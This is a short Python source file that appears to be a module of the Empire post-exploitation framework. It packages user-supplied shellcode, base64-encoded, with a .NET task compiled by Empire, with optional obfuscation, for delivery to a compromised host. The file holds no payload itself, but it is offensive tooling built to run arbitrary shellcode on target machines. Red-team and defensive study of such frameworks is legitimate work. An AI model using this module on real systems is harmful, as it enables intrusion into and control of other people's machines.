import yaml

from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        try:
            base64_shellcode = params["File"].get_base64_file()
        except Exception as e:
            return None, f"Failed to get base64 encoded shellcode: {e}"

        compiler_dict: dict = yaml.safe_load(module.compiler_yaml)
        del compiler_dict[0]["Empire"]
        compiler_yaml: str = yaml.dump(compiler_dict, sort_keys=False)

        script_file = main_menu.dotnet_compiler.compile_task(
            compiler_yaml,
            module.name,
            dotnet=params["DotNetVersion"].lower(),
            confuse=obfuscate,
        )

        script_end = f",{base64_shellcode} "
        return f"{script_file}|{script_end}", None
